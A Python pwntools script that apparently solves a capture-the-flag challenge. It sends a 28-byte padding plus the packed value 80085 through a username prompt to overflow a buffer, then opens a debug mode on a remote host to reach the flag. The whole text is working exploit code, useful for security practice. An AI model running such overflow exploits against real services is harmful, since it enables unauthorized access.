from pwn import *

# Set the target address and buffer size
target_ip = "35.184.182.18"  # Provided target IP
target_port = 32001  # Provided target port

# Define the payload size to overwrite the buffer
payload_size = 28  # Payload size to fill the buffer
overwrite_value = struct.pack('<I', 80085)  # Pack the value 80085 in little-endian

# Create the payload
payload = b"A" * payload_size  # Fill buffer with 'A's
payload += overwrite_value  # Append the packed value

# Create a process or connect to the target
p = remote(target_ip, target_port)

# Interact with the server and send payload
print(p.recvuntil(b"Your Choice, senpai: "))  # Receive the initial prompt
p.sendline(b'1')  # Choose to rename the user
print(p.recvuntil(b"Enter your new username, User-senpai: "))  # Receive prompt for new username
p.sendline(payload)  # Send the crafted payload to overwrite the value

# Now, let's choose to access Debug Mode
print(p.recvuntil(b"Your Choice, senpai: "))  # Receive prompt again
p.sendline(b'3')  # Choose Debug Mode to potentially access the flag

# Receive the response
p.interactive()

